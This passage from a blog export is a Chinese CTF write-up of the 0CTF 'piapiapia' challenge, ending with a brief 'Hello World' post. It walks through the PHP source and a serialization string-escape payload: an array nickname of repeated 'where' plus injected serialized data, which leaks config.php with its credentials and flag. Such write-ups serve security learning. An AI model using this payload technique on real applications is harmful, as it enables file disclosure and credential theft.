<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Login First'</span>);</span><br><span class="line">&#125;   </span><br><span class="line">$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line"><span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123; </span><br><span class="line">    header(<span class="string">'Location: update.php'</span>); <span class="comment">//$profile为空，跳转到update.php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    $profile = unserialize($profile); <span class="comment">//一般看见unserialize()会考虑反序列化漏洞，</span></span><br><span class="line">    $phone = $profile[<span class="string">'phone'</span>]; </span><br><span class="line">    $email = $profile[<span class="string">'email'</span>]; </span><br><span class="line">    $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">    $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));<span class="comment">//file_get_contents()此函数可以获得文件内容</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>update.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">    $file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">    <span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">    move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">    $profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">    $profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">    $profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">    $profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">    $user-&gt;update_profile($username, serialize($profile));<span class="comment">//将$profile序列化，执行过滤函数</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看update_profile()函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">    $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">    $new_profile = <span class="keyword">parent</span>::filter($new_profile); </span><br><span class="line">    $where = <span class="string">"username = '$username'"</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看filter()函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">    $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>); </span><br><span class="line">    $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>; </span><br><span class="line">    $string = preg_replace($escape, <span class="string">'_'</span>, $string); <span class="comment">//将  “ ‘ ”、 “\\\\” 替换成 “_” </span></span><br><span class="line">    $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">    $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string); <span class="comment">//将“ select|insert|update|delete|where” 替换成 "hacker"，返回替换后的字符串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在update_profile()，返回到profile.php.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile = unserialize($profile); <span class="comment">//反序列化$profile</span></span><br><span class="line">    $phone = $profile[<span class="string">'phone'</span>]; </span><br><span class="line">    $email = $profile[<span class="string">'email'</span>]; </span><br><span class="line">    $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">    $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br></pre></td></tr></table></figure>

<p>序列化后</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$profile=a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"11111111111"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">8</span>:<span class="string">"12@12.12"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;s:<span class="number">4</span>:<span class="string">"1234"</span>;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">39</span>:<span class="string">"upload/d41d8cd98f00b204e9800998ecf8427e"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>要让$photo得到的文件是config.php也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;</span><br></pre></td></tr></table></figure>
<p>变成 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;</span><br></pre></td></tr></table></figure>
<p>序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。</p>
<p>因为nickname有长度限制使用数组可以绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>
<p>让nickname的值为<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34,传入34个where</p>
<h3 id="0x03-开始操作"><a href="#0x03-开始操作" class="headerlink" title="0x03 开始操作"></a>0x03 开始操作</h3><p><img src="/pic/1.png" alt="1"> 传入参数</p>
<p>访问profile.php</p>
<p><img src="/pic/2.png" alt="2"></p>
<p>将base64解码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">'qwertyuiop'</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">'challenges'</span>;</span><br><span class="line">$flag = <span class="string">'flag&#123;94b7c4b2-866d-4189-9b0a-abdf22990071&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>buuctf</tag>
        <tag>0CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2019/12/19/hello-world/</url>
    <content><![CDATA[<p>第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移</p>
]]></content>
  </entry>
</search>
